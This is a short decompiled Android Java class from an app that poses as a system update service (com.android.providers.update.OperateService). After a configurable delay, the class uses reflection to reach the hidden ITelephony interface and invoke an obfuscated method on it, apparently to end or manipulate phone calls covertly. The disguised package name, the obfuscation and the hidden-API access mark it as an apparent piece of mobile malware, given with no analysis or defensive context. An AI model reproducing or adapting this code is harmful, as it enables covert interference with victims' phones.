package defpackage;

import android.telephony.TelephonyManager;
import com.android.providers.update.OperateService;
import java.lang.reflect.Method;

/* renamed from: f reason: default package */
public class f implements Runnable {
    final /* synthetic */ String a;
    final /* synthetic */ OperateService b;

    public f(OperateService operateService, String str) {
        this.b = operateService;
        this.a = str;
    }

    public void run() {
        try {
            int parseInt = Integer.parseInt(this.a);
            for (int i = 0; i <= parseInt; i++) {
                Thread.sleep(1000);
            }
            TelephonyManager telephonyManager = (TelephonyManager) this.b.getSystemService("phone");
            Method declaredMethod = TelephonyManager.class.getDeclaredMethod("getITelephony", null);
            declaredMethod.setAccessible(true);
            ((m) declaredMethod.invoke(telephonyManager, null)).a();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
